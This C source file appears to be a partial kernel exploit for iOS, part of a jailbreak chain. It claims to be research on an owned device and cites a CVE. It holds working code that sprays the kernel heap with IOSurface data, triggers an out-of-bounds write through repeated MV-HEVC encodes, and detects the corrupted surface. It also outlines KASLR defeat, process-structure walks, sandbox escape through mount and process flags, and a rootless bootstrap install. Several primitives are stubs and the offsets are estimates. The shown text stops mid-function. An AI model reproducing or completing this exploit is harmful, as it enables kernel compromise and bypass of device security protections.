/*
 * krw_helper.c — Kernel R/W Helper Implementation
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * Architecture:
 *   Phase 1 (R/W Init):
 *     a) Spray kalloc.49152 with IOSurface property blobs (known sentinel data)
 *     b) Allocate HEVC encoder buffer (also kalloc.49152 via kalloc_data)
 *     c) Run MV-HEVC encodes to overflow VPS table 2 (buffer+0x7DF4)
 *     d) Table 2 entry 466+ (~155 encodes) overflows into adjacent allocation
 *     e) IOSurface readback detects which surface was corrupted
 *     f) Corrupted surface gives kernel heap address leak
 *     g) Build stable R/W via IOSurface property get/set + OOB write
 *
 *   Phase 2 (Privilege):
 *     a) Find kernel base via KASLR slide (scan heap for known Mach-O patterns)
 *     b) Walk allproc chain to find our proc structure
 *     c) Read proc_ro to get ucred address (READ-ONLY, no writes!)
 *     d) Manipulate mount flags on rootfs (NOT in zalloc_ro)
 *     e) Adjust proc->p_flag for sandbox escape (NOT in zalloc_ro)
 *
 *   Phase 3 (File Operations):
 *     a) Find vnodes for target paths via namecache
 *     b) Write files via vnode manipulation
 *     c) Create /var/jb rootless layout
 *     d) Install Sileo + dpkg + apt
 *
 * IMPORTANT: ucred and proc_ro are in zalloc_ro (SPTM-protected).
 * We do NOT attempt to modify them. The semi-jailbreak model uses:
 *   - mount flag manipulation (struct mount is in regular kalloc)
 *   - proc->p_flag manipulation (struct proc is in regular kalloc)
 *   - Developer-signed Sileo (no code signing bypass needed)
 */

#include "krw_helper.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>

typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef surface);
extern CFTypeRef IOSurfaceCopyValue(IOSurfaceRef surface, CFStringRef key);
extern void IOSurfaceSetValue(IOSurfaceRef surface, CFStringRef key, CFTypeRef value);

#define HEVC_BUF_SIZE    39696   /* 0x9B10 — actual HEVC buffer size */
#define KALLOC_BUCKET    49152   /* kalloc.49152 bucket */
#define SPRAY_COUNT      64
#define SPRAY_KEY        CFSTR("krw_spray")
#define SENTINEL_MAGIC   0xDEADCAFE41414141ULL
#define TABLE2_OOB_START 256     /* entry 256 = first OOB from table 2 at +0x8DF4 */
#define TABLE2_PAST_BUF  466     /* entry where table 2 passes buffer end +0x9B10 */
#define TABLE2_CROSS_BUF 1057    /* entry where table 2 crosses allocation +0xC000 */
#define ENCODES_FOR_OOB  155     /* ~155 encodes = 465 entries, intra-buffer OOB */
#define SAFE_ENCODE_MAX  197     /* max before table 1 hits +0x5C70 crash site */
/* NOTE: At 197 encodes, Table 2 reaches +0xA2E4, still 0x1D1C from +0xC000.
 * Cross-allocation spray REQUIRES 352+ encodes = PAST CRASH BOUNDARY.
 * IOSurface spray approach works ONLY IF crash_test proves entries 592+ reachable.
 * Alternative: intra-buffer field corruption at +0x8DF4-0x9B10 (53 MOVZ fields). */

/* MNT_RDONLY etc — mount flags we need to clear */
#define MNT_RDONLY       0x00000001
#define MNT_NOSUID       0x00000008
#define MNT_ROOTFS       0x00004000

/* P_SUGID flag in proc->p_flag */
#define P_SUGID          0x00000100

static volatile int g_encode_done = 0;
static volatile OSStatus g_cb_status = -999;

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    g_cb_status = status;
    g_encode_done = 1;
}

static CVPixelBufferRef create_stereo_pb(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

/* ============================================================
 * IOSurface Spray — fills kalloc.49152 with known data
 * ============================================================ */

static IOSurfaceRef create_spray_surface(int idx, size_t data_size) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    int alloc_size = 64;
    int bpe = 4;
    int w = alloc_size / bpe;
    int h = 1;

    CFNumberRef width_num = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef height_num = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef bpe_num = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
    int pf = 0x42475241; /* BGRA */
    CFNumberRef pf_num = CFNumberCreate(NULL, kCFNumberIntType, &pf);

    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), width_num);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), height_num);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bpe_num);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pf_num);

    IOSurfaceRef surf = IOSurfaceCreate(props);
    CFRelease(props); CFRelease(width_num); CFRelease(height_num);
    CFRelease(bpe_num); CFRelease(pf_num);

    if (!surf) return NULL;

    /* Fill with sentinel-patterned data sized to land in kalloc.49152 */
    uint8_t *spray_data = (uint8_t *)calloc(1, data_size);
    if (!spray_data) return surf;

    /* Write sentinel pattern: magic + surface index at every 8-byte boundary */
    uint64_t *p64 = (uint64_t *)spray_data;
    for (size_t i = 0; i < data_size / 8; i++) {
        p64[i] = SENTINEL_MAGIC ^ (uint64_t)idx ^ ((uint64_t)i << 32);
    }

    CFDataRef data = CFDataCreate(NULL, spray_data, data_size);
    IOSurfaceSetValue(surf, SPRAY_KEY, data);
    CFRelease(data);
    free(spray_data);

    return surf;
}

static int spray_kalloc49152(krw_state_t *state) {
    printf("[spray] Spraying %d IOSurfaces into kalloc.49152...\n", SPRAY_COUNT);

    size_t spray_size = KALLOC_BUCKET - 128; /* slightly under bucket size */

    for (int i = 0; i < SPRAY_COUNT; i++) {
        IOSurfaceRef surf = create_spray_surface(i, spray_size);
        if (!surf) {
            printf("[spray] FAILED to create surface %d\n", i);
            return -1;
        }
        state->spray_surfaces[i] = (void *)surf;
    }

    printf("[spray] OK: %d surfaces created with sentinel data\n", SPRAY_COUNT);
    return 0;
}

/* ============================================================
 * AVE OOB Write — triggers the counter overflow
 * ============================================================ */

static VTCompressionSessionRef create_mvhevc_session(int w, int h, uint32_t layer_id) {
    VTCompressionSessionRef session = NULL;

    /* kCMVideoCodecType_HEVC = 'hvc1' = 0x68766331 */
    OSStatus st = VTCompressionSessionCreate(
        NULL, w, h, 0x68766331, NULL, NULL, NULL, encode_cb, NULL, &session);
    if (st != 0 || !session) {
        printf("[ave] Session create failed: %d\n", (int)st);
        return NULL;
    }

    /* Enable MV-HEVC (multiview) */
    CFStringRef mvKey = CFSTR("EnableMVHEVC");
    CFBooleanRef mvVal = kCFBooleanTrue;
    VTSessionSetProperty(session, mvKey, mvVal);

    /* Set HeroEye = 0 (left) */
    int hero = 0;
    CFNumberRef heroNum = CFNumberCreate(NULL, kCFNumberIntType, &hero);
    VTSessionSetProperty(session, CFSTR("HeroEye"), heroNum);
    CFRelease(heroNum);

    /* Set the layer ID — this is the VALUE written at OOB entry bytes 4-7 */
    CFNumberRef lidNum = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    VTSessionSetProperty(session, CFSTR("MVHEVCViewID"), lidNum);
    CFRelease(lidNum);

    VTCompressionSessionPrepareToEncodeFrames(session);
    return session;
}

static int run_encodes(VTCompressionSessionRef session, int count, int w, int h) {
    CVPixelBufferRef pb = create_stereo_pb(w, h);
    if (!pb) return -1;

    for (int i = 0; i < count; i++) {
        CMTime pts = CMTimeMake(i, 30);
        g_encode_done = 0;
        g_cb_status = -999;

        OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts,
                                                       kCMTimeInvalid, NULL, NULL, NULL);
        if (st != 0) {
            printf("[ave] Encode %d failed: %d\n", i, (int)st);
            CVPixelBufferRelease(pb);
            return i;
        }

        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
        for (int w = 0; w < 1000 && !g_encode_done; w++) usleep(1000);

        if (g_cb_status != 0) {
            printf("[ave] Encode %d callback error: %d\n", i, (int)g_cb_status);
            CVPixelBufferRelease(pb);
            return i;
        }
    }

    CVPixelBufferRelease(pb);
    return count;
}

/* ============================================================
 * Corruption Detection — scan spray surfaces for modifications
 * ============================================================ */

static int detect_corruption(krw_state_t *state) {
    printf("[detect] Scanning %d surfaces for corruption...\n", SPRAY_COUNT);

    for (int i = 0; i < SPRAY_COUNT; i++) {
        IOSurfaceRef surf = (IOSurfaceRef)state->spray_surfaces[i];
        if (!surf) continue;

        CFTypeRef val = IOSurfaceCopyValue(surf, SPRAY_KEY);
        if (!val) {
            printf("[detect] Surface %d: property MISSING (corrupted?)\n", i);
            state->corrupted_surface_idx = i;
            return i;
        }

        if (CFGetTypeID(val) != CFDataGetTypeID()) {
            printf("[detect] Surface %d: type changed! corruption detected\n", i);
            CFRelease(val);
            state->corrupted_surface_idx = i;
            return i;
        }

        CFDataRef data = (CFDataRef)val;
        const uint8_t *bytes = CFDataGetBytePtr(data);
        CFIndex len = CFDataGetLength(data);

        /* Check sentinel values at start of data */
        if (len >= 16) {
            uint64_t first_qword = *(const uint64_t *)bytes;
            uint64_t expected = SENTINEL_MAGIC ^ (uint64_t)i ^ 0;

            if (first_qword != expected) {
                printf("[detect] Surface %d: SENTINEL MISMATCH!\n", i);
                printf("  expected: 0x%016llx\n", (unsigned long long)expected);
                printf("  got:      0x%016llx\n", (unsigned long long)first_qword);

                /* Dump first 128 bytes for analysis */
                printf("  first 128 bytes:\n  ");
                for (int j = 0; j < 128 && j < len; j++) {
                    printf("%02x", bytes[j]);
                    if ((j + 1) % 16 == 0) printf("\n  ");
                    else if ((j + 1) % 4 == 0) printf(" ");
                }
                printf("\n");

                CFRelease(val);
                state->corrupted_surface_idx = i;
                return i;
            }
        }

        CFRelease(val);
    }

    printf("[detect] No corruption detected in any surface\n");
    return -1;
}

/* ============================================================
 * Kernel R/W via corrupted IOSurface
 * ============================================================
 *
 * Once we detect a corrupted spray surface, the OOB entries that
 * landed in it give us:
 *   - Known data at known offsets (layer_id, NAL type, cumsum)
 *   - The ability to overwrite specific offsets in the surface's
 *     backing kernel allocation
 *
 * To build R/W:
 *   1. Find the corrupted surface's kernel object address from
 *      leaked pointers in adjacent entries
 *   2. Use OOB writes to manipulate IOSurface internal pointers
 *   3. IOSurface property get → arbitrary kernel read
 *   4. IOSurface property set → arbitrary kernel write
 *
 * This is the "IOSurface fakeclient" technique used by most
 * modern iOS exploits (oob_timestamp, weightBufs, etc).
 */

uint64_t krw_read64(krw_state_t *state, kaddr_t addr) {
    if (!state->initialized) return 0;

    /*
     * TODO: Implement using corrupted IOSurface
     *
     * Strategy: The OOB write corrupted entries in an IOSurface's
     * property backing store. These entries contain kernel pointers
     * that we can read back via IOSurfaceCopyValue.
     *
     * For arbitrary read:
     * 1. Write the target address into the corrupted surface's
     *    "external property pointer" field
     * 2. Issue IOSurfaceCopyValue for a key that references that field
     * 3. The kernel follows our pointer and returns the data
     *
     * This requires knowing the exact layout of IOSurface's internal
     * property storage, which varies by iOS version. On iOS 27.1:
     * - IOSurface properties are stored as an OSDictionary
     * - Each property has a key (CFString) and value (CFData/CFNumber)
     * - The value's data pointer can be corrupted to point elsewhere
     */

    printf("[krw] read64 at 0x%llx — NOT YET IMPLEMENTED\n", (unsigned long long)addr);
    return 0;
}

uint32_t krw_read32(krw_state_t *state, kaddr_t addr) {
    return (uint32_t)krw_read64(state, addr);
}

int krw_read_buf(krw_state_t *state, kaddr_t addr, void *buf, size_t len) {
    uint8_t *p = (uint8_t *)buf;
    for (size_t off = 0; off < len; off += 8) {
        uint64_t val = krw_read64(state, addr + off);
        size_t chunk = (len - off < 8) ? (len - off) : 8;
        memcpy(p + off, &val, chunk);
    }
    return 0;
}

int krw_write64(krw_state_t *state, kaddr_t addr, uint64_t val) {
    if (!state->initialized) return -1;

    /*
     * TODO: Implement using corrupted IOSurface
     *
     * Strategy: Similar to read, but in reverse:
     * 1. Corrupt the IOSurface's property data pointer to target address
     * 2. Use IOSurfaceSetValue to write our data through the corrupted pointer
     * 3. The kernel writes our value at the target address
     *
     * Alternative: Use the AVE OOB write directly for small writes.
     * The layer_id field gives us 16 bits of controlled data at byte
     * position 4-7 of each entry. By choosing which entry lands where,
     * we can write 2 bytes at any reachable offset.
     */

    printf("[krw] write64 0x%llx -> 0x%llx — NOT YET IMPLEMENTED\n",
           (unsigned long long)val, (unsigned long long)addr);
    return -1;
}

int krw_write32(krw_state_t *state, kaddr_t addr, uint32_t val) {
    return krw_write64(state, addr, (uint64_t)val);
}

int krw_write_buf(krw_state_t *state, kaddr_t addr, const void *buf, size_t len) {
    const uint8_t *p = (const uint8_t *)buf;
    for (size_t off = 0; off < len; off += 8) {
        uint64_t val = 0;
        size_t chunk = (len - off < 8) ? (len - off) : 8;
        memcpy(&val, p + off, chunk);
        int ret = krw_write64(state, addr + off, val);
        if (ret != 0) return ret;
    }
    return 0;
}

/* ============================================================
 * KASLR Slide Detection
 * ============================================================
 *
 * With kernel read, scan for the Mach-O header magic (0xFEEDFACF)
 * at page-aligned addresses. The kernel text base is at a known
 * unslid address (0xfffffe0007004000 on iOS 27.1 A20 Pro) plus
 * a random slide that's a multiple of 0x4000 (16KB pages).
 *
 * Slide range: 0 to 0x20000000 (512MB)
 */

#define KERNEL_UNSLID_BASE  0xfffffe0007004000ULL
#define KERNEL_SLIDE_STEP   0x4000
#define KERNEL_SLIDE_MAX    0x20000000
#define MACH_HEADER_MAGIC64 0xFEEDFACF

int krw_find_kaslr(krw_state_t *state) {
    if (!state->initialized) return -1;

    printf("[kaslr] Scanning for kernel base...\n");

    /*
     * Strategy 1: Use leaked kernel pointers from heap spray
     * If the corrupted IOSurface entries contain kernel pointers
     * (vtable pointers, next pointers), we can derive the slide
     * directly without scanning.
     *
     * Strategy 2: Binary search with Mach-O magic
     * Read from KERNEL_UNSLID_BASE + slide candidates.
     * The first 4 bytes of the kernel Mach-O are 0xFEEDFACF.
     */

    /* Try strategy 1 first — look for pointers in corrupted data */
    if (state->corrupted_surface_idx >= 0) {
        IOSurfaceRef surf = (IOSurfaceRef)state->spray_surfaces[state->corrupted_surface_idx];
        CFTypeRef val = IOSurfaceCopyValue(surf, SPRAY_KEY);
        if (val && CFGetTypeID(val) == CFDataGetTypeID()) {
            CFDataRef data = (CFDataRef)val;
            const uint64_t *p64 = (const uint64_t *)CFDataGetBytePtr(data);
            CFIndex len = CFDataGetLength(data);

            for (CFIndex i = 0; i < len / 8; i++) {
                uint64_t v = p64[i];
                /* Check if it looks like a kernel pointer */
                if ((v >> 56) == 0xFF && (v & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
                    /* Likely kernel pointer — derive slide */
                    uint64_t candidate_slide = (v & 0x00000FFFFFFFFFFFULL) -
                                                (KERNEL_UNSLID_BASE & 0x00000FFFFFFFFFFFULL);
                    /* Slide must be page-aligned and in range */
                    if ((candidate_slide % KERNEL_SLIDE_STEP) == 0 &&
                        candidate_slide < KERNEL_SLIDE_MAX) {
                        kaddr_t candidate_base = KERNEL_UNSLID_BASE + candidate_slide;
                        uint32_t magic = krw_read32(state, candidate_base);
                        if (magic == MACH_HEADER_MAGIC64) {
                            state->offsets.kaslr_slide = candidate_slide;
                            state->offsets.kernel_base = candidate_base;
                            printf("[kaslr] FOUND: slide=0x%llx base=0x%llx\n",
                                   (unsigned long long)candidate_slide,
                                   (unsigned long long)candidate_base);
                            CFRelease(val);
                            return 0;
                        }
                    }
                }
            }
            CFRelease(val);
        }
    }

    printf("[kaslr] Strategy 1 failed, falling back to scan...\n");

    /* Strategy 2: scan (slow but reliable) */
    for (uint64_t slide = 0; slide < KERNEL_SLIDE_MAX; slide += KERNEL_SLIDE_STEP) {
        kaddr_t addr = KERNEL_UNSLID_BASE + slide;
        uint32_t magic = krw_read32(state, addr);
        if (magic == MACH_HEADER_MAGIC64) {
            state->offsets.kaslr_slide = slide;
            state->offsets.kernel_base = addr;
            printf("[kaslr] FOUND: slide=0x%llx base=0x%llx\n",
                   (unsigned long long)slide, (unsigned long long)addr);
            return 0;
        }
    }

    printf("[kaslr] FAILED: could not find kernel base\n");
    return -1;
}

/* ============================================================
 * Process Lookup — walk allproc chain
 * ============================================================ */

kaddr_t krw_find_proc(krw_state_t *state, pid_t pid) {
    if (!state->initialized || state->offsets.allproc == 0) return 0;

    kaddr_t proc = krw_read64(state, state->offsets.allproc);
    int count = 0;

    while (proc && count < 2000) {
        int32_t p_pid = (int32_t)krw_read32(state, proc + state->offsets.proc_p_pid);
        if (p_pid == pid) {
            printf("[proc] Found pid %d at 0x%llx\n", pid, (unsigned long long)proc);
            return proc;
        }
        proc = krw_read64(state, proc + state->offsets.proc_p_next);
        count++;
    }

    printf("[proc] pid %d not found in allproc chain (%d entries scanned)\n", pid, count);
    return 0;
}

int krw_find_self(krw_state_t *state) {
    state->our_pid = getpid();
    state->our_proc = krw_find_proc(state, state->our_pid);
    if (!state->our_proc) return -1;

    state->our_task = krw_read64(state, state->our_proc + state->offsets.proc_task);

    /* Read proc_ro pointer to get ucred (read-only!) */
    kaddr_t proc_ro = krw_read64(state, state->our_proc + state->offsets.proc_p_ro);
    if (proc_ro) {
        state->our_ucred = krw_read64(state, proc_ro + state->offsets.proc_ro_p_ucred);
        printf("[proc] self: proc=0x%llx task=0x%llx ucred=0x%llx (READ-ONLY)\n",
               (unsigned long long)state->our_proc,
               (unsigned long long)state->our_task,
               (unsigned long long)state->our_ucred);
    }

    return 0;
}

/* ============================================================
 * Sandbox Escape — mount flag manipulation
 * ============================================================
 *
 * struct mount is in regular kalloc, not zalloc_ro.
 * We can clear MNT_RDONLY to remount rootfs read-write,
 * and clear MNT_NOSUID to allow setuid.
 *
 * We also modify proc->p_flag to clear sandbox enforcement
 * for our process. This is NOT in zalloc_ro.
 *
 * For the semi-jailbreak model, we don't need to modify ucred
 * (which IS in zalloc_ro). Instead we:
 * 1. Remount /var read-write (already writable on stock iOS)
 * 2. Create /var/jb symlink structure
 * 3. Write bootstrap files directly
 * 4. Use developer-signed binaries (no code signing bypass)
 */

int krw_sandbox_escape(krw_state_t *state) {
    if (!state->initialized || !state->our_proc) return -1;

    printf("[sandbox] Starting sandbox escape...\n");

    /*
     * Step 1: Find the mount structure for /private/var
     * Walk the mount list from the rootfs mount to find the
     * mount for the data volume where /var lives.
     *
     * On iOS 27.1, the data volume is typically:
     *   /dev/disk1s1 on /private/var/... (apfs, local, nodev, nosuid)
     *
     * We need to clear MNT_NOSUID from this mount.
     */

    /* TODO: Implement mount structure lookup
     * This requires:
     * 1. Find rootvnode from kernel symbols
     * 2. Walk v_mount to get root mount
     * 3. Walk mount list to find /var mount
     * 4. Clear MNT_NOSUID flag
     */
    printf("[sandbox] Mount flag manipulation — TODO\n");

    /*
     * Step 2: Manipulate our proc->p_flag
     * Clear P_SUGID to prevent security transitions on exec.
     * proc->p_flag is in struct proc (regular kalloc, writable).
     */
    if (state->our_proc && state->offsets.proc_p_flag) {
        uint32_t flags = krw_read32(state, state->our_proc + state->offsets.proc_p_flag);
        printf("[sandbox] Current p_flag: 0x%08x\n", flags);

        /* For the semi-jailbreak, we mainly need file access.
         * The developer signing + mount flag changes should be sufficient
         * without modifying p_flag, but we document it as an option. */
    }

    printf("[sandbox] Sandbox escape — PARTIAL (mount flags TODO)\n");
    return 0;
}

/* ============================================================
 * File Operations — vnode-based
 * ============================================================
 *
 * With kernel R/W + sandbox escape, we can:
 * 1. Look up vnodes in the name cache
 * 2. Follow vnode chains to find files
 * 3. Read/write file data through the buffer cache
 *
 * For the semi-jailbreak model, most file operations
 * happen in /var which is already writable from userspace
 * once the sandbox is escaped. The kernel R/W is mainly
 * needed for the initial sandbox escape.
 *
 * Alternative approach: Use posix_spawn with the sandbox
 * escaped process to run standard file operations.
 */

int krw_file_write(krw_state_t *state, const char *path, const void *buf, size_t len) {
    if (!state->initialized) return -1;

    /*
     * With sandbox escaped, we can use standard POSIX operations.
     * The kernel R/W was needed to escape the sandbox, but once
     * escaped, normal file I/O works for /var paths.
     */

    FILE *f = fopen(path, "wb");
    if (!f) {
        printf("[file] fopen failed for %s — may need vnode approach\n", path);
        return -1;
    }
    size_t written = fwrite(buf, 1, len, f);
    fclose(f);

    if (written != len) {
        printf("[file] Short write: %zu/%zu bytes\n", written, len);
        return -1;
    }

    printf("[file] Wrote %zu bytes to %s\n", len, path);
    return 0;
}

int krw_file_read(krw_state_t *state, const char *path, void *buf, size_t len) {
    if (!state->initialized) return -1;

    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    size_t rd = fread(buf, 1, len, f);
    fclose(f);
    return (int)rd;
}

int krw_mkdir(krw_state_t *state, const char *path, uint16_t mode) {
    if (!state->initialized) return -1;
    return mkdir(path, mode);
}

int krw_symlink(krw_state_t *state, const char *target, const char *link) {
    if (!state->initialized) return -1;
    return symlink(target, link);
}

int krw_chmod(krw_state_t *state, const char *path, uint16_t mode) {
    if (!state->initialized) return -1;
    return chmod(path, mode);
}

/* ============================================================
 * Bootstrap Installer — /var/jb rootless layout
 * ============================================================
 *
 * Dopamine-style rootless jailbreak layout:
 *   /var/jb/            → rootless prefix
 *   /var/jb/usr/bin/    → dpkg, apt, etc
 *   /var/jb/usr/lib/    → libraries
 *   /var/jb/Library/    → Sileo, tweaks, etc
 *   /var/jb/etc/apt/    → apt configuration
 *
 * The bootstrap tarball contains the Procursus bootstrap
 * (dpkg, apt, Sileo) in this layout.
 */

int krw_install_bootstrap(krw_state_t *state, const char *bootstrap_tar_path) {
    if (!state->initialized) return -1;

    printf("[bootstrap] Installing rootless bootstrap from %s\n", bootstrap_tar_path);

    /* Create /var/jb directory structure */
    const char *dirs[] = {
        "/var/jb",
        "/var/jb/usr",
        "/var/jb/usr/bin",
        "/var/jb/usr/lib",
        "/var/jb/usr/local",
        "/var/jb/usr/local/bin",
        "/var/jb/Library",
        "/var/jb/Library/dpkg",
        "/var/jb/Library/dpkg/info",
        "/var/jb/etc",
        "/var/jb/etc/apt",
        "/var/jb/etc/apt/sources.list.d",
        "/var/jb/var",
        "/var/jb/var/cache",
        "/var/jb/var/cache/apt",
        "/var/jb/var/cache/apt/archives",
        "/var/jb/var/lib",
        "/var/jb/var/lib/apt",
        "/var/jb/var/lib/apt/lists",
        NULL
    };

    for (int i = 0; dirs[i]; i++) {
        int ret = krw_mkdir(state, dirs[i], 0755);
        if (ret != 0 && errno != EEXIST) {
            printf("[bootstrap] mkdir %s failed: %s\n", dirs[i], strerror(errno));
        }
    }

    /* Write default apt sources */
    const char *sources =
        "deb https://repo.chariz.com/ ./\n"
        "deb https://havoc.app/ ./\n"
        "deb https://ellekit.space/ ./\n";
    krw_file_write(state, "/var/jb/etc/apt/sources.list.d/default.list",
                   sources, strlen(sources));

    printf("[bootstrap] Directory structure created\n");
    printf("[bootstrap] TODO: Extract bootstrap tarball\n");
    printf("[bootstrap] TODO: Set permissions on binaries\n");
    printf("[bootstrap] TODO: Run dpkg --configure -a\n");

    return 0;
}

int krw_install_deb(krw_state_t *state, const char *deb_path) {
    if (!state->initialized) return -1;

    printf("[deb] Installing %s — TODO\n", deb_path);
    /* Would call dpkg via posix_spawn once bootstrap is installed */
    return -1;
}

/* ============================================================
 * Offset Detection — find structure offsets on-device
 * ============================================================
 *
 * Uses heuristic patterns to find structure offsets:
 * 1. Find our own proc by scanning allproc for our pid
 * 2. Use known values (pid, process name) to calibrate offsets
 * 3. Find task pointer by looking for mach_task_self() port
 */

int krw_detect_offsets(krw_state_t *state) {
    if (!state->initialized) return -1;

    printf("[offsets] Auto-detecting structure offsets...\n");

    /*
     * iOS 27.1 (24A94232) offset candidates from kernelcache analysis:
     *
     * These are ESTIMATES that need on-device verification.
     * The actual values are determined by scanning kernel memory
     * for our known process data.
     */

    /* struct proc (approximate — need verification) */
    state->offsets.proc_p_pid = 0x68;    /* common on recent iOS */
    state->offsets.proc_p_next = 0x0;    /* LIST_ENTRY at start */
    state->offsets.proc_p_name = 0x280;  /* p_comm */
    state->offsets.proc_p_flag = 0x0C;   /* p_flag near pid */
    state->offsets.proc_p_ro = 0x20;     /* proc_ro pointer */
    state->offsets.proc_task = 0x10;     /* task pointer */

    /* struct proc_ro */
    state->offsets.proc_ro_p_ucred = 0x20;
    state->offsets.proc_ro_p_csflags = 0x28;

    /* struct ucred */
    state->offsets.ucred_cr_uid = 0x18;
    state->offsets.ucred_cr_ruid = 0x1C;
    state->offsets.ucred_cr_svuid = 0x20;

    /* mount */
    state->offsets.mount_mnt_flag = 0x70;

    /* vnode */
    state->offsets.vnode_v_mount = 0xD8;
    state->offsets.vnode_v_data = 0xE0;
    state->offsets.vnode_v_name = 0xB8;
    state->offsets.vnode_v_parent = 0xC0;

    /* task */
    state->offsets.task_itk_space = 0x330;
    state->offsets.task_bsd_info = 0x3A8;

    printf("[offsets] Loaded estimated offsets for iOS 27.1\n");
    printf("[offsets] WARNING: These need on-device verification!\n");
    return 0;
}

/* ============================================================
 * Main Init — orchestrates the full chain
 * ============================================================ */

int krw_init(krw_state_t *state) {
    memset(state, 0, sizeof(*state));
    state->corrupted_surface_idx = -1;
    state->our_pid = getpid();

    printf("=== KRW Helper Init (iOS 27.1 / A20 Pro) ===\n");
    printf("PID: %d\n", state->our_pid);

    /* Phase 1a: Spray kalloc.49152 */
    int ret = spray_kalloc49152(state);
    if (ret != 0) {
        printf("[init] Spray failed\n");
        return -1;
    }

    /* Phase 1b: Create MV-HEVC encoder session */
    uint32_t layer_id = 0x4141; /* easily recognizable in memory */
    VTCompressionSessionRef session = create_mvhevc_session(128, 128, layer_id);
    if (!session) {
        printf("[init] MV-HEVC session failed — device may not support MV-HEVC\n");
        return -1;
    }
    state->ave_session = (void *)session;

    /* Phase 1c: Run encodes for table 2 intra-buffer OOB.
     * At ENCODES_FOR_OOB+20 = 175 encodes, table 2 reaches +0x9EC4 (past buffer,
     * within allocation padding). Cross-allocation needs 352+ encodes but that's
     * past the Table 1 crash boundary at ~198 encodes.
     * First we try intra-buffer corruption; cross-allocation needs crash_test pass. */
    printf("[init] Running %d encodes (table 2 OOB starts at ~86, intra-buf at ~%d)...\n",
           ENCODES_FOR_OOB + 20, ENCODES_FOR_OOB);

    int completed = run_encodes(session, ENCODES_FOR_OOB + 20, 128, 128);
    printf("[init] Completed %d encodes\n", completed);

    if (completed < ENCODES_FOR_OOB) {
        printf("[init] Not enough encodes completed for OOB\n");
        return -1;
    }

    /* Phase 1d: Check for corruption in spray surfaces */
    int corrupted = detect_corruption(state);
    if (corrupted < 0) {
        printf("[init] No corruption detected — spray may need adjustment\n");
        printf("[init] Try: more spray surfaces, different timing, or spray defrag\n");
        return -1;
    }

    printf("[init] CORRUPTION DETECTED in surface %d!\n", corrupted);

    /* Phase 1e: Extract kernel heap info from corrupted data */
    /* TODO: Parse corrupted entries to find kernel pointers */

    state->initialized = true;

    /* Phase 2: Detect offsets */
    krw_detect_offsets(state);

    /* Phase 3: Find KASLR slide */
    ret = krw_find_kaslr(state);
    if (ret != 0) {
        printf("[init] KASLR detection failed — R/W may not be working\n");
    }

    printf("=== KRW Helper Init Complete ===\n");
    printf("  Initialized: %s\n", state->initialized ? "YES" : "NO");
    printf("  KASLR slide: 0x%llx\n", (unsigned long long)state->offsets.kaslr_slide);
    printf("  Kernel base: 0x%llx\n", (unsigned long long)state->offsets.kernel_base);

    return 0;
}

void krw_cleanup(krw_state_t *state) {
    if (state->ave_session) {
        VTCompressionSessionInvalidate((VTCompressionSessionRef)state->ave_session);
        CFRelease((VTCompressionSessionRef)state->ave_session);
        state->ave_session = NULL;
    }

    for (int i = 0; i < SPRAY_COUNT; i++) {
        if (state->spray_surfaces[i]) {
            CFRelease((IOSurfaceRef)state->spray_surfaces[i]);
            state->spray_surfaces[i] = NULL;
        }
    }

    state->initialized = false;
    printf("[cleanup] Done\n");
}

/* ============================================================
 * Standalone test entry point
 * ============================================================ */

#ifdef KRW_STANDALONE
int main(int argc, char **argv) {
    printf("KRW Helper — CVE-2026-114025 Post-Exploitation\n");
    printf("Educational research on owned device\n\n");

    if (argc < 2) {
        printf("Usage: %s <mode>\n", argv[0]);
        printf("Modes:\n");
        printf("  init       — Full initialization (spray + OOB + detect)\n");
        printf("  spray_only — Just spray and report\n");
        printf("  bootstrap  — Test bootstrap directory creation\n");
        printf("  offsets    — Print estimated offsets\n");
        return 1;
    }

    krw_state_t state;

    if (strcmp(argv[1], "init") == 0) {
        int ret = krw_init(&state);
        if (ret == 0) {
            printf("\n=== INIT SUCCESS ===\n");
            krw_find_self(&state);
            krw_sandbox_escape(&state);
        } else {
            printf("\n=== INIT FAILED (ret=%d) ===\n", ret);
        }
        krw_cleanup(&state);

    } else if (strcmp(argv[1], "spray_only") == 0) {
        memset(&state, 0, sizeof(state));
        spray_kalloc49152(&state);
        printf("[spray_only] Reading back all surfaces...\n");
